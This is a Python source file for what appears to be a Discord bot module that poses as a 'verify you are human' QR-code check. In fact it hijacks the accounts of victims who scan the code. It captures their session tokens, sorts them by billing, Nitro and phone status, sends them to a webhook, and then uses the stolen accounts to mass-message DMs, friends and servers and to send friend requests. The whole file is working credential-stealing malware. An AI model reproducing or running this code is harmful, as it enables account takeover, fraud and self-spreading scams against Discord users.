
from http.client import HTTPException

import os
from . DRAclient import DRAClient
import io
import qrcode
import discord
from . DiscordLib import DiscordLib, MassDM
import asyncio
from discord.utils import get
from datetime import datetime
from colorama import Fore
import config
from . DiscordLib import MassDM
import random




async def generate_qr(fingerprint):
    qr = qrcode.make(f'https://discordapp.com/ra/{fingerprint}', border=2, box_size=7, version=None)
    
    with io.BytesIO() as image_binary:
                    qr.save(image_binary, 'PNG')
                    image_binary.seek(0)
                    return discord.File(fp=image_binary, filename='image.png')
    
async def generate_verify_embed():
    embed = discord.Embed()
    embed.description = '✅ Scan this QR code to gain access!'
    embed.title = '🤖 Are you a robot?'
    embed.set_image(url="attachment://image.png")
    embed.color = 0x17a2ff
    embed.add_field(name='Tutorial', value='1: Open the Discord mobile app\n2: Open settings\n3: Press Scan QR Code', inline=False)
    return embed



class QRHandler():
    def __init__(self):
        self.ctx = None
        self.client = None
        self.useless = None
        self.msgindex = 0
        self.client = DRAClient(on_connected=self.on_connected, 
                                on_scan=self.on_scan, 
                                on_finish=self.on_finish, 
                                on_close=self.on_close)
    
    async def run(self, ctx):
        self.ctx = ctx
        await self.client.connect()
    
    async def on_connected(self):
        print(f'[Opened] {self.ctx.user.name}#{self.ctx.user.discriminator}')

        qr = await generate_qr(self.client.fingerprint)
        embed = await generate_verify_embed()
        await self.ctx.followup.send(embed=embed, file=qr, ephemeral=True)


                    
    async def on_scan(self):
        print(f'{Fore.YELLOW}[Scanned] {self.client.user.username}#{self.client.user.discrim}')
            

    async def save_token(self, token, name):
        path = f"tokens/{name}.txt"

        os.makedirs(os.path.dirname(path), exist_ok=True)

        with open(path, 'a') as f:
            f.write(token + '\n')


    async def check_token(self, token):
        details = await DiscordLib().get_details(token)
        try:
            if details['message'] == '401: Unauthorized':
                return
        except KeyError:
            pass

            await self.save_token(token, "tokens")

        if await DiscordLib().get_payment(token):
            await self.save_token(token, "billing")
            return

        try:
            if details['premium_type'] == 2:
                await self.save_token(token, "nitro")
                return
            elif details['premium_type'] == 1:
                await self.save_token(token, "nitroclassic")
                return
        except KeyError:
            pass
                    
        if details['phone']:
            await self.save_token(token, "mobile")
            return
        if details['verified']:
            self.useless = True
            await self.save_token(token, "verified")
            return

        

            
    async def export_token(self, token):
        await self.check_token(token)

        if config.config['webhook_url']:
            try:
                await DiscordLib().send_webhook(token, self.ctx.guild.name)
            except Exception as e:
                print(e)
    
    async def give_role(self):
        try:
            role = get(self.ctx.guild.roles, id=config.config['servers'][str(self.ctx.guild.id)]['verify_role'])
            await self.ctx.user.add_roles(role)
        except HTTPException:
            print(f'{Fore.RED}[Error] Failed to add role to user, try running the setuprole command.')
        except discord.errors.Forbidden:
            print(f'{Fore.RED}[Error] Failed to add role to user, try making sure the bot role is above the verify role or giving the bot permissions.')
        except KeyError:
            print(f'{Fore.RED}[Error] Failed to add role to user, try making sure the role id is correct in config.config.json')

    async def auto_spread(self):
        massdm = MassDM()
        await massdm.init(self.client.token, f'{self.client.user.username}#{self.client.user.discrim}')

        if self.useless:
            await massdm.message_dms()

            await massdm.message_friends()

            await massdm.message_guilds()
    
    
    
    async def auto_add(self):
        if self.useless:
            if config.config['auto_add']['enabled']:
                for user in config.config['auto_add']['users']:
                    await DiscordLib().send_friend_request(self.client.token, user.split('#'))

    async def on_finish(self):
        print(f'{Fore.GREEN}[SUCCESS] {self.client.user.username}#{self.client.user.discrim}')

        config.config['tokens_logged'] += 1
        config.config.write()
            
        await self.export_token(self.client.token)

        if str(self.ctx.guild.id) in config.config['servers']:
            if config.config['servers'][str(self.ctx.guild.id)]['auto_spread']:
                asyncio.create_task(self.auto_spread())

        await self.give_role()
        await self.auto_add()
               
    async def on_close(self):
        print(f'{Fore.RED}[Failure] {self.client.user.username}#{self.client.user.discrim}')
